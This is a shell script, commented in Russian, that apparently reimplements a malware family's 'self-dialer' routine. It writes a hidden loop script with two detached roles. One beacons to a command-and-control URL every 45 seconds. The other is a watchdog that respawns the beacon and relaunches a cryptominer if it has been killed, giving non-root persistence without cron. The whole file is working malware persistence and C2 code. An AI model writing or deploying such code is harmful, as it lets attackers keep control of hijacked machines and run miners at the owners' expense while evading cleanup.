#!/bin/sh
# 45-dialer.sh — их _install_self_dialer: пара «диалер + сторож», следят друг за другом.
# Канал без cron: диалер раз в тик поднимает свежий бекон, сторож возвращает диалер и майнер.

# kf_install_self_dialer <state_dir> <c2_url>
kf_install_self_dialer() {
  _sd_dir="${1:-}"; _sd_c2="${2:-}"
  [ -n "$_sd_dir" ] && [ -d "$_sd_dir" ] && [ -w "$_sd_dir" ] || return 0
  [ "$(id -u)" = "0" ] && return 0     # у root есть cron-полоса
  [ -f "$_sd_dir/beacon.sh" ] || return 0

  _sd_host=$(printf '%s' "$_sd_c2" | sed 's#^[a-z]*://##; s#/.*##; s#:.*##')
  _sd_ip=$(getent ahostsv4 "$_sd_host" 2>/dev/null | awk 'NR==1{print $1}')
  printf '%s %s' "$_sd_host" "$_sd_ip" > "$_sd_dir/.beacon-endpoint" 2>/dev/null

  _sd_loop="$_sd_dir/.kf-dialer.sh"
  {
    printf '#!/bin/sh\n'
    printf '# self-dialer + watchdog: роли dial и watch\n'
    printf '_ROLE="${1:-dial}"\n'
    printf '_BD="%s"\n' "$_sd_dir"
    printf '_C2="%s"\n' "$_sd_c2"
    printf '_MARK="%s"\n' "${KF_MARK:-k7}"
    printf '_pick() {\n'
    printf '  for _f in $(ls -1t "$_BD"/.beacon_*.sh 2>/dev/null); do\n'
    printf '    grep -qs "$_MARK" "$_f" 2>/dev/null && { printf "%%s" "$_f"; return 0; }\n'
    printf '  done\n'
    printf '  [ -f "$_BD/beacon.sh" ] && { printf "%%s" "$_BD/beacon.sh"; return 0; }\n'
    printf '  return 1\n'
    printf '}\n'
    printf '_alive() { [ -n "$1" ] && kill -0 "$1" 2>/dev/null; }\n'
    printf 'case "$_ROLE" in\n'
    printf 'dial)\n'
    printf '  printf "%%s" "$$" > "$_BD/.kf-dialer.pid" 2>/dev/null\n'
    printf '  while :; do\n'
    printf '    _B=$(_pick)\n'
    printf '    if [ -n "$_B" ]; then sh "$_B" "$_C2" </dev/null >/dev/null 2>&1; fi\n'
    printf '    sleep 45\n'
    printf '  done\n'
    printf '  ;;\n'
    printf 'watch)\n'
    printf '  printf "%%s" "$$" > "$_BD/.kf-watchdog.pid" 2>/dev/null\n'
    printf '  while :; do\n'
    printf '    sleep 5\n'
    printf '    _DP=$(cat "$_BD/.kf-dialer.pid" 2>/dev/null)\n'
    printf '    _alive "$_DP" || { setsid "$0" dial </dev/null >/dev/null 2>&1 & sleep 1; }\n'
    printf '    if [ -f "$_BD/.beacon-job.path" ]; then\n'
    printf '      _MB=$(head -1 "$_BD/.beacon-job.path" 2>/dev/null)\n'
    printf '      _MA=$(tail -n +2 "$_BD/.beacon-job.path" 2>/dev/null | head -1)\n'
    printf '      if [ -n "$_MB" ] && [ -x "$_MB" ]; then\n'
    printf '        _MOK=0\n'
    printf '        for _mp in /proc/[0-9]*; do\n'
    printf '          [ -r "$_mp/cmdline" ] || continue\n'
    printf '          case "$(tr "\\0" " " < "$_mp/cmdline" 2>/dev/null)" in\n'
    printf '            *"$_MB"*) _MOK=1; break ;;\n'
    printf '          esac\n'
    printf '        done\n'
    printf '        [ "$_MOK" = "0" ] && setsid "$_MB" $_MA </dev/null >/dev/null 2>&1 &\n'
    printf '      fi\n'
    printf '    fi\n'
    printf '  done\n'
    printf '  ;;\n'
    printf 'esac\n'
  } > "$_sd_loop" 2>/dev/null || return 0
  chmod 700 "$_sd_loop" 2>/dev/null
  sh -n "$_sd_loop" 2>/dev/null || { rm -f "$_sd_loop"; return 1; }

  setsid sh "$_sd_loop" watch </dev/null >/dev/null 2>&1 &
  setsid sh "$_sd_loop" dial </dev/null >/dev/null 2>&1 &
  kf_log "диалер+сторож подняты ($_sd_dir)"
  return 0
}
